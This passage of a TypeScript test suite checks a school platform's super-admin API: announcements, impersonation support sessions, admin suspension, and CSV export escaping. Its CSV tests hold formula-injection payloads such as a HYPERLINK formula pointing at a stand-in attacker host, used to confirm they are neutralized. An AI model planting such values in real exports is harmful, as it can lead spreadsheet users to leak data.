    it('PATCH /announcements/:id — update title → 200, title updated in response', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/announcements/${announcementId}`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ title: 'Scheduled Maintenance — Updated' });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.title).toBe('Scheduled Maintenance — Updated');
    });

    it('POST /announcements/:id/publish — valid → 200, has published_at and recipients_count', async () => {
      const res = await request(app)
        .post(`/api/super-admin/announcements/${announcementId}/publish`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({});
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.published_at).toBeDefined();
      expect(typeof res.body.data.recipients_count).toBe('number');
    });

    it('POST /announcements/:id/publish — already published → 409 ALREADY_PUBLISHED', async () => {
      const res = await request(app)
        .post(`/api/super-admin/announcements/${announcementId}/publish`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({});
      expect(res.status).toBe(409);
      expect(res.body.error.code).toBe('ALREADY_PUBLISHED');
    });

    it('DELETE /announcements/:id — already published → 409 ALREADY_PUBLISHED', async () => {
      const res = await request(app)
        .delete(`/api/super-admin/announcements/${announcementId}`)
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(409);
      expect(res.body.error.code).toBe('ALREADY_PUBLISHED');
    });

    it('DELETE /announcements/:id — unpublished announcement → 200', async () => {
      const createRes = await request(app)
        .post('/api/super-admin/announcements')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          title: 'Temporary Notice',
          body: 'This announcement will be deleted before publishing.',
          type: 'info',
          target_plans: ['trial'],
        });
      expect(createRes.status).toBe(201);
      const tempId = createRes.body.data.id;

      const res = await request(app)
        .delete(`/api/super-admin/announcements/${tempId}`)
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.deleted).toBe(true);
    });
  });

  // ── Impersonation & Support Sessions ─────────────────────────────────────────

  describe('Impersonation & Support Sessions', () => {
    const TEACHER_ID = '37a19d2d-fa5d-45d3-9dc1-5ea1875ef3e0';
    let sessionId: string;
    let scopedToken: string;
    let fakeSuperAdminInSchoolId: string;

    beforeAll(async () => {
      const result = await pool.query<{ id: string }>(
        `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, is_active, teacher_mode, must_change_password)
         VALUES ($1, $2, 'test-hash', 'super_admin', 'Fake', 'SuperAdmin', true, 'subject', false)
         RETURNING id`,
        [SCHOOL_ID, `fake-superadmin-${randomUUID()}@test.com`]
      );
      fakeSuperAdminInSchoolId = result.rows[0].id;
    });

    afterAll(async () => {
      await pool.query(`DELETE FROM users WHERE id = $1`, [fakeSuperAdminInSchoolId]);
      if (sessionId) {
        await pool.query(`DELETE FROM platform_audit_logs WHERE support_session_id = $1`, [sessionId]);
        await pool.query(`DELETE FROM support_sessions WHERE id = $1`, [sessionId]);
      }
    });

    // ── POST /support-sessions ───────────────────────────────────────────

    it('POST /support-sessions — missing reason → 400 VALIDATION_ERROR', async () => {
      const res = await request(app)
        .post('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: SCHOOL_ID, user_id: TEACHER_ID });
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('POST /support-sessions — reason too short (<10 chars) → 400', async () => {
      const res = await request(app)
        .post('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: SCHOOL_ID, user_id: TEACHER_ID, reason: 'too short' });
      expect(res.status).toBe(400);
    });

    it('POST /support-sessions — target user is super_admin → 403 FORBIDDEN', async () => {
      const res = await request(app)
        .post('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: SCHOOL_ID, user_id: fakeSuperAdminInSchoolId, reason: 'Investigating a support ticket' });
      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    it('POST /support-sessions — valid body with teacher user_id → 200, returns session_id and scoped_token', async () => {
      const res = await request(app)
        .post('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: SCHOOL_ID, user_id: TEACHER_ID, reason: 'Investigating a support ticket' });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.session_id).toBeDefined();
      expect(res.body.data.scoped_token).toBeDefined();
      sessionId = res.body.data.session_id;
      scopedToken = res.body.data.scoped_token;
    });

    it('POST /support-sessions — valid body with a 6-digit support code instead of a UUID → 200', async () => {
      const codeResult = await pool.query<{ support_code: string }>(
        `SELECT support_code FROM users WHERE id = $1`,
        [TEACHER_ID]
      );
      const supportCode = codeResult.rows[0].support_code;

      const res = await request(app)
        .post('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: SCHOOL_ID, user_id: supportCode, reason: 'Investigating a support ticket' });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.session_id).toBeDefined();
      expect(res.body.data.scoped_token).toBeDefined();

      // Clean up this extra session (and its audit trail) so it doesn't linger
      // for later tests or block the outer afterAll's user/school deletion.
      await pool.query(`DELETE FROM platform_audit_logs WHERE support_session_id = $1`, [res.body.data.session_id]);
      await pool.query(`DELETE FROM support_sessions WHERE id = $1`, [res.body.data.session_id]);
    });

    // ── Scoped token on a school-level route ──────────────────────────────

    it('GET /api/schools/:schoolId/dashboard/teacher/overview with scoped_token → 200', async () => {
      const res = await request(schoolApp)
        .get(`/api/schools/${SCHOOL_ID}/dashboard/teacher/overview`)
        .set('Authorization', `Bearer ${scopedToken}`)
        .set('X-Support-Session-Id', sessionId);
      expect(res.status).toBe(200);
    });

    // ── Scoped token rejected on super-admin routes ────────────────────────

    it('GET /api/super-admin/schools with scoped_token → 403 (not 401)', async () => {
      const res = await request(app)
        .get('/api/super-admin/schools')
        .set('Authorization', `Bearer ${scopedToken}`)
        .set('X-Support-Session-Id', sessionId);
      expect(res.status).toBe(403);
    });

    // ── PATCH /support-sessions/:id/end ────────────────────────────────────

    it('PATCH /support-sessions/:id/end — valid sessionId → 200, has duration_minutes', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/support-sessions/${sessionId}/end`)
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(typeof res.body.data.duration_minutes).toBe('number');
      expect(res.body.data.duration_minutes).toBeGreaterThanOrEqual(0);
    });

    // ── Scoped token rejected after session ended ──────────────────────────

    it('GET /api/schools/:schoolId/dashboard/teacher/overview with scoped_token after session ended → 401 SESSION_ENDED', async () => {
      const res = await request(schoolApp)
        .get(`/api/schools/${SCHOOL_ID}/dashboard/teacher/overview`)
        .set('Authorization', `Bearer ${scopedToken}`)
        .set('X-Support-Session-Id', sessionId);
      expect(res.status).toBe(401);
      expect(res.body.error.code).toBe('SESSION_ENDED');
    });

    // ── GET /support-sessions ──────────────────────────────────────────────

    it('GET /support-sessions — super_admin token → 200, includes ended session with status ended', async () => {
      const res = await request(app)
        .get('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      const found = res.body.data.find((s: { id: string }) => s.id === sessionId);
      expect(found).toBeDefined();
      expect(found.status).toBe('ended');
    });
  });

  // ── csvCell — formula/CSV injection prevention ───────────────────────────────

  describe('csvCell — formula/CSV injection prevention', () => {
    it.each(['=HYPERLINK("https://attacker.tld","x")', '+1+1', '-1+1', '@SUM(1,1)', '\tmalicious', '\rmalicious'])(
      'prefixes a leading apostrophe when the cell starts with a formula-trigger character (%s)',
      (input) => {
        const result = csvCell(input);
        // \r also matches the pre-existing quote-wrapping regex, so unwrap before
        // asserting — the leading apostrophe must survive either way.
        const unquoted = result.startsWith('"') && result.endsWith('"') ? result.slice(1, -1).replace(/""/g, '"') : result;
        expect(unquoted.startsWith("'")).toBe(true);
        expect(unquoted).toBe(`'${input}`);
      }
    );

    it('does not alter a normal string with no formula-trigger prefix', () => {
      expect(csvCell('Jane Doe')).toBe('Jane Doe');
    });

    it('still quotes/escapes a formula-triggering value that also contains a comma and a quote', () => {
      const input = '=HYPERLINK("evil","click"),extra';
      const result = csvCell(input);
      expect(result.startsWith('"')).toBe(true);
      expect(result.endsWith('"')).toBe(true);
      expect(result).toBe(`"'${input.replace(/"/g, '""')}"`);
    });

    it('leaves null/undefined as an empty string', () => {
      expect(csvCell(null)).toBe('');
      expect(csvCell(undefined)).toBe('');
    });
  });

  describe('GET /schools/:schoolId/export — formula injection is neutralized end-to-end', () => {
    let csvSchoolId: string;
    let csvUserId: string;
    let csvStudentId: string;
    const maliciousName = '=HYPERLINK("https://attacker.tld/?d=1","Click me")';

    beforeAll(async () => {
      const schoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['CSV Injection Test School', `test-csv-injection-${randomUUID()}`]
      );
      csvSchoolId = schoolResult.rows[0].id;

      const userResult = await pool.query<{ id: string }>(
        `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, is_active, teacher_mode, must_change_password)
         VALUES ($1, $2, 'test-hash', 'student', $3, 'Injection', true, 'subject', false)
         RETURNING id`,
        [csvSchoolId, `csv-injection-${randomUUID()}@test.com`, maliciousName]
      );
      csvUserId = userResult.rows[0].id;

      const studentResult = await pool.query<{ id: string }>(
        `INSERT INTO students (school_id, user_id, admission_no, gender, dob)
         VALUES ($1, $2, $3, 'F', '2010-01-01')
         RETURNING id`,
        [csvSchoolId, csvUserId, `CSV-INJ-${randomUUID()}`]
      );
      csvStudentId = studentResult.rows[0].id;
    }, 20000);

    afterAll(async () => {
      await pool.query(`DELETE FROM students WHERE id = $1`, [csvStudentId]);
      await pool.query(`DELETE FROM users WHERE id = $1`, [csvUserId]);
      await pool.query(`DELETE FROM schools WHERE id = $1`, [csvSchoolId]);
    });

    it('a student full_name starting with "=" is neutralized with a leading apostrophe in the CSV output', async () => {
      const res = await request(app)
        .get(`/api/super-admin/schools/${csvSchoolId}/export`)
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      const lines = res.text.split('\n');
      const dataLine = lines.find((line) => line.includes('Injection'));
      expect(dataLine).toBeDefined();
      // Raw "=HYPERLINK(...)" must never appear un-neutralized — it must be preceded
      // by a leading apostrophe (either bare or inside the quoted cell).
      expect(dataLine).not.toMatch(/,=HYPERLINK/);
      expect(dataLine).toMatch(/'=HYPERLINK/);
    });
  });

  // ── Platform Admin Suspension & Deletion — cache + support-session invalidation ──

  describe('Platform Admin Suspension & Deletion — cache + support-session invalidation', () => {
    const TEACHER_ID = '37a19d2d-fa5d-45d3-9dc1-5ea1875ef3e0';

    let redisStore: Map<string, string>;
    let mockRedisGet: jest.Mock;
    let mockRedisSet: jest.Mock;
    let mockRedisDel: jest.Mock;
    let isolatedApp: express.Express;
    let isolatedPool: { end: () => Promise<void> };
    let rootAdminToken: string;
    const createdAdminIds: string[] = [];

    async function createTargetAdmin(label: string): Promise<{ id: string; email: string }> {
      const email = `${label}-${randomUUID()}@test.com`;
      const result = await pool.query<{ id: string }>(
        `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, is_active, teacher_mode, must_change_password)
         VALUES (NULL, $1, 'test-hash', 'super_admin', 'Target', 'Admin', true, 'subject', false)
         RETURNING id`,
        [email]
      );
      createdAdminIds.push(result.rows[0].id);
      return { id: result.rows[0].id, email };
    }

    // Fixed, test-owned value so rootGuard is deterministic regardless of what
    // (if anything) the real .env's ROOT_ADMIN_EMAIL resolves to in this DB —
    // matches the pattern in tests/payoutSettings.test.ts.
    const ROOT_ADMIN_EMAIL = `root-admin-test-${randomUUID()}@chronixedu-test.com`;

    beforeAll(async () => {
      process.env.ROOT_ADMIN_EMAIL = ROOT_ADMIN_EMAIL;
      const rootRow = await pool.query<{ id: string; email: string }>(
        `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, is_active, teacher_mode, must_change_password)
         VALUES (NULL, $1, 'test-hash', 'super_admin', 'Root', 'Admin', true, 'subject', false)
         RETURNING id, email`,
        [ROOT_ADMIN_EMAIL]
      );
      createdAdminIds.push(rootRow.rows[0].id);
      rootAdminToken = makeToken(rootRow.rows[0].id, 'super_admin', null, rootRow.rows[0].email);

      // Build a second app instance whose superAdmin router was loaded with a mocked,
      // in-memory Redis client — so we can assert on cache-busting/blacklisting calls
      // without disturbing the top-level `app` (which other tests in this file rely on
      // running against the real, unmocked `redis` — null in this test environment).
      redisStore = new Map();
      mockRedisGet = jest.fn(async (key: string) => (redisStore.has(key) ? (redisStore.get(key) as string) : null));
      mockRedisSet = jest.fn(async (key: string, value: string) => {
        redisStore.set(key, value);
        return 'OK';
      });
      mockRedisDel = jest.fn(async (key: string) => (redisStore.delete(key) ? 1 : 0));

      let isolatedSuperAdminRouter: express.Router;
      jest.isolateModules(() => {
        jest.doMock('../src/middleware/rateLimit', () => {
          const actual = jest.requireActual('../src/middleware/rateLimit');
          return {
            ...actual,
            redis: { get: mockRedisGet, set: mockRedisSet, del: mockRedisDel },
          };
        });
        // eslint-disable-next-line @typescript-eslint/no-var-requires
        isolatedSuperAdminRouter = require('../src/routes/superAdmin').default;
        // isolateModules gives superAdmin.ts (and everything it transitively requires,
        // including db/client.ts) a fresh module registry — so it gets its own `pg`
        // Pool, separate from the `pool` this file imported at the top. Grab it so it
        // can be closed below; otherwise it's a dangling open handle after the suite.
        // eslint-disable-next-line @typescript-eslint/no-var-requires
        isolatedPool = require('../src/db/client').default;
      });

      isolatedApp = express();
      isolatedApp.use(express.json());
      isolatedApp.use('/api/super-admin', isolatedSuperAdminRouter!);
      isolatedApp.use(errorHandler);
    }, 20000);

    afterAll(async () => {
      if (createdAdminIds.length > 0) {
        // Root admin acted as platform_admin_id on every suspend/delete audit row
        // this suite generated; target admins appear as target_user_id — clean up
        // both directions before deleting the users themselves (FK constraint).
        await pool.query(`DELETE FROM platform_audit_logs WHERE target_user_id = ANY($1) OR platform_admin_id = ANY($1)`, [createdAdminIds]);
        await pool.query(`DELETE FROM support_sessions WHERE platform_admin_id = ANY($1)`, [createdAdminIds]);
        await pool.query(`DELETE FROM users WHERE id = ANY($1)`, [createdAdminIds]);
      }
      await isolatedPool.end();
    });

    beforeEach(() => {
      mockRedisGet.mockClear();
      mockRedisSet.mockClear();
      mockRedisDel.mockClear();
    });

    it('PATCH /admins/:id/suspend — busts the user_active cache so the suspended admin is rejected immediately', async () => {
      const target = await createTargetAdmin('suspend-cache');
      const targetToken = makeToken(target.id, 'super_admin', null, target.email);

      // Simulate the worst case for the old 300s-TTL bug: the cache says "active"
      // right up until the moment of suspension.
      redisStore.set(`user_active:${target.id}`, '1');

      const suspendRes = await request(isolatedApp)
        .patch(`/api/super-admin/admins/${target.id}/suspend`)
        .set('Authorization', `Bearer ${rootAdminToken}`)
        .send({ reason: 'Investigating suspicious platform activity' });
      expect(suspendRes.status).toBe(200);
      expect(suspendRes.body.data.is_active).toBe(false);
      expect(mockRedisSet).toHaveBeenCalledWith(`user_active:${target.id}`, '0', 'EX', 300);

      const afterRes = await request(isolatedApp)
        .get('/api/super-admin/schools')
        .set('Authorization', `Bearer ${targetToken}`);
      expect(afterRes.status).toBe(403);
      expect(afterRes.body.error.code).toBe('ACCOUNT_SUSPENDED');
    });

    it('PATCH /admins/:id/suspend — ends the admin\'s active support session and blacklists its scoped token', async () => {
      const target = await createTargetAdmin('suspend-sessions');
      const targetToken = makeToken(target.id, 'super_admin', null, target.email);

      const startRes = await request(isolatedApp)
        .post('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${targetToken}`)
        .send({ school_id: SCHOOL_ID, user_id: TEACHER_ID, reason: 'Investigating a support ticket, pre-suspend' });
      expect(startRes.status).toBe(200);
      const sessionId = startRes.body.data.session_id;
      const scopedToken = startRes.body.data.scoped_token;

      const suspendRes = await request(isolatedApp)
        .patch(`/api/super-admin/admins/${target.id}/suspend`)
        .set('Authorization', `Bearer ${rootAdminToken}`)
        .send({ reason: 'Investigating suspicious platform activity' });
      expect(suspendRes.status).toBe(200);

      const sessionRow = await pool.query<{ ended_at: string | null }>(
        `SELECT ended_at FROM support_sessions WHERE id = $1`,
        [sessionId]
      );
      expect(sessionRow.rows[0].ended_at).not.toBeNull();
      expect(mockRedisSet).toHaveBeenCalledWith(`blacklisted_token:${scopedToken}`, '1', 'EX', expect.any(Number));
    });

    it('DELETE /admins/:id — busts the user_active cache so the deleted admin is rejected immediately', async () => {
      const target = await createTargetAdmin('delete-cache');
      const targetToken = makeToken(target.id, 'super_admin', null, target.email);

      redisStore.set(`user_active:${target.id}`, '1');

      const deleteRes = await request(isolatedApp)
        .delete(`/api/super-admin/admins/${target.id}`)
        .set('Authorization', `Bearer ${rootAdminToken}`)
        .send({ confirmation_email: target.email });
      expect(deleteRes.status).toBe(200);
      expect(deleteRes.body.data.deleted).toBe(true);
      expect(mockRedisSet).toHaveBeenCalledWith(`user_active:${target.id}`, '0', 'EX', 300);

      const afterRes = await request(isolatedApp)
        .get('/api/super-admin/schools')
        .set('Authorization', `Bearer ${targetToken}`);
      expect(afterRes.status).toBe(403);
      expect(afterRes.body.error.code).toBe('ACCOUNT_SUSPENDED');
    });

    it('DELETE /admins/:id — ends the admin\'s active support session and blacklists its scoped token', async () => {
      const target = await createTargetAdmin('delete-sessions');
      const targetToken = makeToken(target.id, 'super_admin', null, target.email);

      const startRes = await request(isolatedApp)
        .post('/api/super-admin/support-sessions')
        .set('Authorization', `Bearer ${targetToken}`)
        .send({ school_id: SCHOOL_ID, user_id: TEACHER_ID, reason: 'Investigating a support ticket, pre-delete' });
      expect(startRes.status).toBe(200);
      const sessionId = startRes.body.data.session_id;
      const scopedToken = startRes.body.data.scoped_token;

      const deleteRes = await request(isolatedApp)
        .delete(`/api/super-admin/admins/${target.id}`)
        .set('Authorization', `Bearer ${rootAdminToken}`)
        .send({ confirmation_email: target.email });
      expect(deleteRes.status).toBe(200);

      const sessionRow = await pool.query<{ ended_at: string | null }>(
        `SELECT ended_at FROM support_sessions WHERE id = $1`,
        [sessionId]
      );
      expect(sessionRow.rows[0].ended_at).not.toBeNull();
      expect(mockRedisSet).toHaveBeenCalledWith(`blacklisted_token:${scopedToken}`, '1', 'EX', expect.any(Number));
    });
  });
});
